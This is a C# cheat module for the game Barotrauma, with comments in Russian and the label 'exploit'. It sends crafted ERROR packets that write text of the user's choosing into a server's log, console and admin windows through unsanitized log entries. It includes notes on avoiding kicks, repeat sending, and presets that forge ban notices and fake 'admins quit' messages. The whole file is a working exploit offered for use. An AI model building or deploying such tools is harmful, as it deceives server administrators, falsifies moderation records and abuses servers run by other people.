// ============================================================================
//  ErrorForgeModule.cs — «ФОРЖЕР ЛОГОВ» v2 (волна 718-719)
//  CWE-117 log injection через ERROR-пакет. ТВОЙ ТЕКСТ → лог сервера.
//
//  ПУТЬ (GameServer.cs:1035 → HandleClientError → MISSING_ENTITY):
//    u16 eventID, u16 entityID, byte subCount(≤5), subCount × string(≤16)
//    строки попадают В ЛОГ СЕРВЕРА БЕЗ санитизации:
//    "...has reported an error: ... Loaded submarines don't match
//     (client: <ТВОЙ ТЕКСТ>, server: <реальные сабы>)"
//    Куда: консоль сервера (красный Error) + файл лога + окна клиентов
//    с пермом ServerLog (админ видит вживую). Парсинг <1мс: 0 страйков,
//    валидный пакет: 0 киков.
//
//  ★ ДЕТАЛЬ ФОРМАТА (вскрыта при ревью): чанки склеиваются string.Join(", ")
//    → между кусками появится мусор ", ". Поэтому:
//      текст ≤16 символов  → subCount=1 → ЧИСТЫЙ текст без разделителей
//      текст длиннее       → режем на 16, между кусками будет ", "
//    >16 симв. в строке = честный кик ("malformed error data") — не шлём.
//
//  УСЛОВИЯ: инъекция работает при GameStarted (нужен запущенный раунд —
//  иначе хвост про сабы не формируется). 80 символов максимум за пакет.
//  Каждый пакет с уникальным eventID вечно живёт в GameAnalytics HashSet
//  (побочная утечка, ~100B/пакет).
// ============================================================================

using System;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class ErrorForgeModule : CSModuleBase
    {
        public override string Id   => "error_forge";
        public override string Name => "Error Forge";
        public override string Description =>
            "Type ANY text -> it gets written into the SERVER log/console and admin log windows " +
            "via ERROR packets (CWE-117, no sanitization). No perms, no kicks, no strikes. " +
            "16 chars = clean line, up to 80 = chunked with ', ' separators.";
        public override string Category => "exploit";

        public override string GetLabel() => "Error Forge 📜";

        private static GUIMessageBox _box;
        private static GUITextBox _textBox;
        private static GUITextBox _repeatBox;
        private static GUITextBlock _status;

        public override void OnClick()
        {
            if (_box != null) { _box.Close(); _box = null; return; }
            Open();
        }

        private static void Open()
        {
            if (GameMain.Client?.ClientPeer == null)
            {
                GUI.AddMessage("[ErrorForge] нет подключения", Color.Red);
                return;
            }

            _box = new GUIMessageBox(
                headerText: "ERROR FORGE — инъекция в лог сервера",
                text: "",
                buttons: new LocalizedString[] { },
                relativeSize: new Vector2(0.66f, 0.5f));

            var content = _box.Content;
            content.ClearChildren();

            new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.22f), content.RectTransform),
                "Твой текст пишется В ЛОГ СЕРВЕРА (консоль + файл + админские окна):\n" +
                "\"...has reported an error: ... don't match (client: ТВОЙ ТЕКСТ, server: ...)\"",
                textAlignment: Alignment.CenterLeft, wrap: true, font: GUIStyle.SmallFont)
            { TextColor = new Color(255, 170, 120) };

            // --- строка ввода ---
            var textRow = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.13f), content.RectTransform),
                isHorizontal: true);
            textRow.RelativeSpacing = 0.01f;

            new GUITextBlock(
                new RectTransform(new Vector2(0.22f, 1f), textRow.RectTransform),
                "Текст:", textAlignment: Alignment.CenterRight);
            _textBox = new GUITextBox(
                new RectTransform(new Vector2(0.78f, 1f), textRow.RectTransform),
                "BAN: SKYLEIOTIC (CHEATS)");

            // --- повторы ---
            var repRow = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.13f), content.RectTransform),
                isHorizontal: true);
            repRow.RelativeSpacing = 0.01f;

            new GUITextBlock(
                new RectTransform(new Vector2(0.22f, 1f), repRow.RectTransform),
                "Повторов:", textAlignment: Alignment.CenterRight);
            _repeatBox = new GUITextBox(
                new RectTransform(new Vector2(0.2f, 1f), repRow.RectTransform),
                "3");

            new GUITextBlock(
                new RectTransform(new Vector2(0.56f, 1f), repRow.RectTransform),
                "(≤16 симв = чисто; длиннее = с ', '", font: GUIStyle.SmallFont)
            { CanBeFocused = false, TextColor = Color.Gray };

            // --- кнопка ОТПРАВИТЬ ---
            var sendBtn = new GUIButton(
                new RectTransform(new Vector2(0.97f, 0.16f), content.RectTransform),
                "📤 ОТПРАВИТЬ В ЛОГ СЕРВЕРА");
            sendBtn.Color = new Color(180, 70, 50);
            sendBtn.OnClicked = (b, d) =>
            {
                Forge(_textBox?.Text ?? "", GetRepeats());
                return true;
            };

            // --- пресеты (заполняют поле) ---
            var presetRow = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.22f), content.RectTransform),
                isHorizontal: true);
            presetRow.RelativeSpacing = 0.01f;

            AddPreset(presetRow, "BAN: HEDREX!", "BAN: HEDREX! (cheats)");
            AddPreset(presetRow, "-15000 MK", "SERVER SOLD SUB: -15000 MK");
            AddPreset(presetRow, "ADMINS QUIT", "ADMINS QUIT. SERVER UNMANAGED");

            _status = new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.14f), content.RectTransform),
                "Статус: жду отправки.", wrap: true, font: GUIStyle.SmallFont);
            _status.TextColor = new Color(120, 220, 255);
        }

        private static void AddPreset(GUILayoutGroup parent, string label, string text)
        {
            var btn = new GUIButton(
                new RectTransform(new Vector2(0.32f, 1f), parent.RectTransform), label);
            btn.Color = new Color(60, 110, 150);
            btn.OnClicked = (b, d) =>
            {
                if (_textBox != null) { _textBox.Text = text; }
                return true;
            };
        }

        private static int GetRepeats()
        {
            if (_repeatBox == null || !int.TryParse(_repeatBox.Text?.Trim(), out int n)) { return 3; }
            return n < 1 ? 1 : (n > 30 ? 30 : n);
        }

        private static void Forge(string line, int repeats)
        {
            if (GameMain.Client?.ClientPeer == null)
            {
                GUI.AddMessage("[ErrorForge] нет подключения", Color.Red);
                return;
            }
            if (string.IsNullOrWhiteSpace(line))
            {
                GUI.AddMessage("[ErrorForge] пустой текст", Color.Red);
                return;
            }
            if (GameMain.NetworkMember == null || !GameMain.NetworkMember.GameStarted)
            {
                GUI.AddMessage("[ErrorForge] раунд не запущен — хвост с 'client:' не формируется (лог получит только цифры)", Color.Orange);
            }

            line = line.Trim();
            bool clean = line.Length <= 16;
            int chunkCount = clean ? 1 : (line.Length + 15) / 16;
            if (chunkCount > 5)
            {
                line = line.Substring(0, 80);
                chunkCount = 5;
            }

            var chunks = new string[chunkCount];
            for (int i = 0; i < chunkCount; i++)
            {
                int len = Math.Min(16, line.Length - i * 16);
                chunks[i] = line.Substring(i * 16, len);
            }

            int sent = 0;
            ushort evId = (ushort)new Random().Next(0, 65535);
            for (int r = 0; r < repeats; r++)
            {
                try
                {
                    var msg = new WriteOnlyMessage();
                    msg.WriteByte((byte)ClientPacketHeader.ERROR);
                    msg.WriteByte(1); // ClientNetError.MISSING_ENTITY (internal — литерал)
                    msg.WriteUInt16((ushort)(evId + r)); // уникальный → +утечка в GameAnalytics
                    msg.WriteUInt16(0);                  // entityID=0 → "entity that doesn't exist"
                    msg.WriteByte((byte)chunkCount);
                    for (int i = 0; i < chunkCount; i++) { msg.WriteString(chunks[i]); }
                    GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                    sent++;
                }
                catch (Exception e)
                {
                    GUI.AddMessage("[ErrorForge] fail: " + e.Message, Color.Red);
                    break;
                }
            }

            string mode = clean ? "ЧИСТО (1 чанк)" : "чанки через ', '";
            string result = $"[ErrorForge] {sent}× отправлено ({mode}): \"{line}\"";
            if (_status != null) { _status.Text = "→ " + result; }
            GUI.AddMessage(result + " — смотри консоль СЕРВЕРА.", Color.OrangeRed);
        }
    }
}
